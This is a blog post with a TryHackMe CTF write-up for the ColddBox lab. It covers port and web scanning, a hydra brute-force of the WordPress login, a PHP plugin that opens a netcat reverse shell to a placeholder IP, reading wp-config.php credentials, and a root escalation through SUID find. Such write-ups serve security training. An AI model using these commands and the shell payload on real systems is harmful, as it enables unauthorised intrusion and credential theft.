---
layout: post
title:  "TryHackMe - ColddBox - Writeup!"
date:   2021-01-07 00:06:59
categories: thm
---


# [COLDDBOX](https://tryhackme.com/room/colddboxeasy) - Starting the box can take some time
---
<br>



### NMAP

First `nmap -sCV 10.10.34.213` run didn't give much ports. Second more wide one has found high port that has `SSH` running on.

{% highlight bash startinline=true %}
$ nmap -p80,4512 -sCV 10.10.34.213 -vvvv -oA spec-ports

PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: ColddBox | One more machine
4512/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDngxJmUFBAeIIIjZkorYEp5ImIX0SOOFtRVgperpxbcxDAosq1rJ6DhWxJyyGo3M+Fx2koAgzkE2d4f2DTGB8sY1NJP1sYOeNphh8c55Psw3Rq4xytY5u1abq6su2a1Dp15zE7kGuROaq2qFot8iGYBVLMMPFB/BRmwBk07zrn8nKPa3yotvuJpERZVKKiSQrLBW87nkPhPzNv5hdRUUFvImigYb4hXTyUveipQ/oji5rIxdHMNKiWwrVO864RekaVPdwnSIfEtVevj1XU/RmG4miIbsy2A7jRU034J8NEI7akDB+lZmdnOIFkfX+qcHKxsoahesXziWw9uBospyhB
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKNmVtaTpgUhzxZL3VKgWKq6TDNebAFSbQNy5QxllUb4Gg6URGSWnBOuIzfMAoJPWzOhbRHAHfGCqaAryf81+Z8=
|   256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE/fNq/6XnAxR13/jPT28jLWFlqxd+RKSbEgujEaCjEc
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

{% endhighlight %}

### GOBUSTER
---
<br>
Found interesting page that has usernames on it.
{% highlight bash startinline=true %}
$ gobuster dir -u http://10.10.34.213  -w /usr/share/wordlists/dirb/common.txt -e
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.34.213
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/01/07 15:06:06 Starting gobuster
===============================================================
http://10.10.34.213/.hta (Status: 403)
http://10.10.34.213/.htaccess (Status: 403)
http://10.10.34.213/.htpasswd (Status: 403)
http://10.10.34.213/hidden (Status: 301)
http://10.10.34.213/index.php (Status: 301)
http://10.10.34.213/server-status (Status: 403)
http://10.10.34.213/wp-admin (Status: 301)
http://10.10.34.213/wp-content (Status: 301)
http://10.10.34.213/wp-includes (Status: 301)
http://10.10.34.213/xmlrpc.php (Status: 200)
===============================================================
2021/01/07 15:06:58 Finished
===============================================================
{% endhighlight %}


### USERS

One of the pages from `Gobuster` helped find them.
{% highlight bash startinline=true %}
C0ldd
Hugo
Philip
{% endhighlight %}


### NIKTO

Nikto results from the given `IP`, also found interesting pages.
{% highlight bash startinline=true %}
$ nikto -h http://10.10.34.213
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.34.213
+ Target Hostname:    10.10.34.213
+ Target Port:        80
+ Start Time:         2021-01-07 15:09:50 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3092: /hidden/: This might be interesting...
+ OSVDB-3092: /xmlrpc.php: xmlrpc.php was found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /: A Wordpress installation was found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login.php: Wordpress login found
+ 7889 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2021-01-07 15:28:36 (GMT2) (1126 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endhighlight %}

### CMSMAP
This is a result of `CMSMap`

{% highlight bash startinline=true %}
$ cmsmap http://10.10.34.213
[-] Date & Time: 07/01/2021 15:18:38
[-] ExploitDB and CMSmap plugins are not updated to the latest version
[-] Would you like to update it?
[y/N]: 
[I] Threads: 5
[-] Target: http://10.10.34.213 (10.10.34.213)
[M] Website Not in HTTPS: http://10.10.34.213
[I] Server: Apache/2.4.18 (Ubuntu)
[L] X-Frame-Options: Not Enforced
[I] Strict-Transport-Security: Not Enforced
[I] X-Content-Security-Policy: Not Enforced
[I] X-Content-Type-Options: Not Enforced
[L] No Robots.txt Found
[I] CMS Detection: WordPress
[I] Wordpress Version: 4.1.31
[M]  EDB-ID: 47720 "WordPress Core 5.3 - User Disclosure"
[M]  EDB-ID: 47800 "WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service"
[M]  EDB-ID: 47557 "WordPress Core 5.2.4 - Cross-Origin Resource Sharing"
[M]  EDB-ID: 47361 "WordPress Core 5.2.3 - Cross-Site Host Modification"
[M]  EDB-ID: 47690 "WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts"
[M]  EDB-ID: 46511 "WordPress Core 5.0 - Remote Code Execution"
[M]  EDB-ID: 46662 "WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)"
[M]  EDB-ID: 44949 "WordPress Core < 4.9.6 - (Authenticated) Arbitrary File Deletion"
[M]  EDB-ID: 41963 "WordPress Core < 4.7.4 - Unauthorized Password Reset"
[M]  EDB-ID: 41497 "WordPress Core < 4.7.1 - Username Enumeration"
[M]  EDB-ID: 41223 "WordPress Core 4.7.0/4.7.1 - Content Injection (Python)"
[M]  EDB-ID: 41224 "WordPress Core 4.7.0/4.7.1 - Content Injection (Ruby)"
[M]  EDB-ID: 41962 "WordPress Core 4.6 - Remote Code Execution"
[M]  EDB-ID: 40288 "WordPress Core 4.5.3 - Directory Traversal / Denial of Service"
[M]  EDB-ID: 36844 "WordPress Core 4.2 - Persistent Cross-Site Scripting"
[I] Wordpress Theme: twentyfifteen
[-] WordPress usernames identified: 
[M] c0ldd
[M] hugo
[M] philip
[M] the cold in person
[M] XML-RPC services are enabled
[I] Forgotten Password Allows Username Enumeration: http://10.10.34.213/wp-login.php?action=lostpassword
[I] Autocomplete Off Not Found: http://10.10.34.213/wp-login.php
[-] Default WordPress Files:
[I] http://10.10.34.213/license.txt
[I] http://10.10.34.213/readme.html
[I] http://10.10.34.213/wp-content/themes/twentyfifteen/genericons/COPYING.txt
[I] http://10.10.34.213/wp-content/themes/twentyfifteen/genericons/LICENSE.txt
[I] http://10.10.34.213/wp-content/themes/twentyfifteen/readme.txt
[I] http://10.10.34.213/wp-content/themes/twentyfourteen/genericons/COPYING.txt
[I] http://10.10.34.213/wp-content/themes/twentyfourteen/genericons/LICENSE.txt
[I] http://10.10.34.213/wp-content/themes/twentyfourteen/genericons/README.txt
[I] http://10.10.34.213/wp-content/themes/twentythirteen/genericons/COPYING.txt
[I] http://10.10.34.213/wp-content/themes/twentythirteen/genericons/LICENSE.txt
[I] http://10.10.34.213/wp-content/themes/twentythirteen/genericons/README.txt
[I] http://10.10.34.213/wp-includes/ID3/license.commercial.txt
[I] http://10.10.34.213/wp-includes/ID3/license.txt
[I] http://10.10.34.213/wp-includes/ID3/readme.txt
[I] http://10.10.34.213/wp-includes/images/crystal/license.txt
[I] http://10.10.34.213/wp-includes/js/plupload/license.txt
[I] http://10.10.34.213/wp-includes/js/swfupload/license.txt
[I] http://10.10.34.213/wp-includes/js/tinymce/license.txt
[-] Searching Wordpress Plugins ...
[I] akismet v3.0.4
[M]  EDB-ID: 37826 "WordPress Core 3.4.2 - Multiple Path Disclosure Vulnerabilities"
[M]  EDB-ID: 37902 "WordPress Plugin Akismet - Multiple Cross-Site Scripting Vulnerabilities"
[I] worprees plugin bug dar
grep: plugin: No such file or directory
grep: bug: No such file or directory
grep: dar[&=/]: No such file or directory
[M]  EDB-ID: 48065 "WordPress Plugin ultimate-member 2.1.3 - Local File Inclusion"
[I] Checking for Directory Listing Enabled ...
[L] http://10.10.34.213/wp-admin/css
[L] http://10.10.34.213/wp-admin/images
[L] http://10.10.34.213/wp-admin/includes
[L] http://10.10.34.213/wp-admin/js
[L] http://10.10.34.213/wp-admin/maint
[L] http://10.10.34.213/wp-includes
[L] http://10.10.34.213/wp-includes/ID3
[L] http://10.10.34.213/wp-includes/SimplePie
[L] http://10.10.34.213/wp-includes/Text
[L] http://10.10.34.213/wp-includes/certificates
[L] http://10.10.34.213/wp-includes/css
[L] http://10.10.34.213/wp-includes/fonts
[L] http://10.10.34.213/wp-includes/images
[L] http://10.10.34.213/wp-includes/js
[L] http://10.10.34.213/wp-includes/pomo
[L] http://10.10.34.213/wp-includes/theme-compat
[-] Date & Time: 07/01/2021 15:20:53
[-] Completed in: 0:02:15

{% endhighlight %}

### C0LDD (User has WP Admin access)
***
<p>
In order to find password used following command.
</p>
{% highlight bash %}
hydra -L usrname.txt -P /usr/share/wordlists/rockyou.txt 10.10.34.213 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
{% endhighlight %}
<br>

### WORDPRESS
***

<br>
Not telling how to do plugin upload and activation on the WP. I've used following code for plugin.
{% highlight php %}
<?php
/**
 * Plugin Name:       My Evil Plugin
 * Plugin URI:        https://example.com/plugins/the-basics/
 * Description:       Handle the basics with this plugin.
 * Version:           1.10.3
 * Requires at least: 5.2
 * Requires PHP:      7.2
 * Author:            John Smith
 * Author URI:        https://author.example.com/
 * License:           GPL v2 or later
 * License URI:       https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain:       my-basics-plugin
 * Domain Path:       /languages
 */

set_time_limit(0);
$VERSION = "1.0";
$chunk_size = 1400;
// Check this out later
$write_a = null;
$error_a = null;

$shell = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f";

$daemon = 0;
$debug = 0;
system($shell);

{% endhighlight %}
<br>

### Shell upgrade 
--- 
<br>
{% highlight bash %}
$ python -c 'import pty; pty.spawn("/bin/bash")'
{% endhighlight %}
Then `Ctrl+Z` and `stty raw -echo` following by `fg` and two times `Enter` hit. As for me `TAB` autocomplete is more than enough.

<br>

### Looking around to find priv esc vector
***

{% highlight bash startinline=true %}
www-data@ColddBox-Easy:/var/www/html/wp-admin$ cat ../wp-config.php
cat ../wp-config.php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cyb^^^^^^ty'); <==REDACTED

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
{% endhighlight %}


### FIND
---
<br>
Privileges Escalation
{% highlight bash startinline=true %}
$ find / -perm -g=s -o -perm -u=s -type f 2>/dev/null     
/bin/su
/bin/ping6
/bin/ping
/bin/fusermount
/bin/umount
/bin/mount
/var/cache/man
/var/mail
/var/local
/var/log/mysql
/usr/bin/bsd-write
/usr/bin/mlocate
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/expiry
/usr/bin/pkexec
/usr/bin/find <=====FOUND
/usr/bin/screen
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/chage
/usr/bin/ssh-agent
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/crontab
/usr/bin/wall
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/local/lib/python3.5
/usr/local/lib/python3.5/dist-packages
/usr/local/share/xml
/usr/local/share/xml/schema
/usr/local/share/xml/misc
/usr/local/share/xml/entities
/usr/local/share/xml/declaration
/usr/local/share/sgml
/usr/local/share/sgml/stylesheet
/usr/local/share/sgml/misc
/usr/local/share/sgml/entities
/usr/local/share/sgml/dtd
/usr/local/share/sgml/declaration
/run/log/journal
/run/log/journal/4e84be335e192a0537e302dd5f6cb171
/sbin/pam_extrausers_chkpwd
/sbin/unix_chkpwd
{% endhighlight %}

### PRIV_ESC
***
<br>
This is a way to escalate priviliges. It can be found on [GTFOBins](https://gtfobins.github.io/gtfobins/find/) site
{% highlight bash startinline=true %}
-rwsr-xr-x 1 root root 221768 Feb  8  2016 /usr/bin/find
www-data@ColddBox-Easy:/var/www/html/wp-admin$ which find
/usr/bin/find

{% endhighlight %}

#### Root (Done this Box)
***
{% highlight sh %}
www-data@ColddBox-Easy:/var/www/html/wp-admin$ find . -exec /bin/sh -p \; -quit

# id 
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# cat /home/c0ldd/user.txt
RmVsaWNpZGFk********************lbCBjb25zZWd1aWRvIQ== <==REDACTED
# cat /root/root.txt
wqFGZWxpY2lkY*******************bmEgY29tcGxldGFkYSE=  <==REDACTED

{% endhighlight %}
***